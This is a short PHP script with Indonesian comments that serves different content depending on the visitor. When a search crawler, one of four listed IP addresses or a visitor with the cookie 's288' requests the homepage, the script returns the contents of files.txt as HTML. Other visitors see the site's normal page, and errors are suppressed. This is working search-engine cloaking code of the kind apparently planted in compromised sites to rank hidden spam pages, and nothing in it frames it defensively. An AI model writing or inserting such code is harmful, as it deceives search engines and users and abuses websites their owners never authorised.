<?php
error_reporting(0); // Sembunyikan error agar tidak muncul Error 500

$visitor_ip = $_SERVER['REMOTE_ADDR'] ?? '';
$agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

// Daftar bot yang lebih lengkap agar terdeteksi GSC
$targets = ["google", "bot", "ahrefs", "bing", "slurp", "facebookexternalhit"];
$is_hit = false;

foreach($targets as $t) {
    if (strpos($agent, $t) !== false) {
        $is_hit = true;
        break;
    }
}

// Tambahkan pengecekan IP atau Cookie sesuai kode awalmu
$allowed_ips = ["85.92.66.150", "81.19.188.236", "81.19.188.235", "85.92.66.149"];
if (in_array($visitor_ip, $allowed_ips) || isset($_COOKIE["s288"])) {
    $is_hit = true;
}

if ($_SERVER["REQUEST_URI"] == "/" && $is_hit) {
    $lp = "files.txt";
    
    // Gunakan timeout agar jika web target mati, web kamu GA DOWN
    $opts = [
        "http" => [
            "method" => "GET",
            "header" => "User-Agent: Mozilla/5.0\r\n",
            "timeout" => 5 
        ]
    ];
    $context = stream_context_create($opts);
    $content_data = @file_get_contents($lp, false, $context);

    if ($content_data) {
        // Kirim header HTML agar tidak dianggap teks biasa
        header('Content-Type: text/html; charset=utf-8');
        echo $content_data;
        exit(); 
    }
}
// Jika bukan bot atau gagal ambil data, HTML asli di bawah akan muncul otomatis
